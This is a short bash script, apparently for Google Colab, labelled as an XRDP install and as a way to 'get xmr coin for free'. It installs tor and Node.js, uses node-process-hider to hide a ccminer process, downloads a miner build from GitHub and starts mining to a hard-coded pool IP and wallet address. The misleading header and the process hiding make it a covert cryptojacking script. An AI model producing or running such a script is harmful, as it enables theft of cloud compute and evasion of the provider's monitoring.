# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R ccminer

sudo apt update -y
sudo apt install gcc -y
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start && curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
apt install nodejs -y
npm install -g npm@8.18.0 -y
npm i -g node-process-hider
ph add ccminer

wget https://github.com/rplant8/ccminer-KlausT-8.21-mod-r18-src-fix/releases/download/1.0.1/ccminer-rplant-yescryptr16-linux-1.0.1.tar.gz
tar xvf ccminer-rplant-yescryptr16-linux-1.0.1.tar.gz
./ccminer -a yescryptr16  -o stratum+tcp://178.128.86.41:80 -u vE1GBjfCJq8yLg7WwxwZAXizE3KZ7D6MiQ.tes
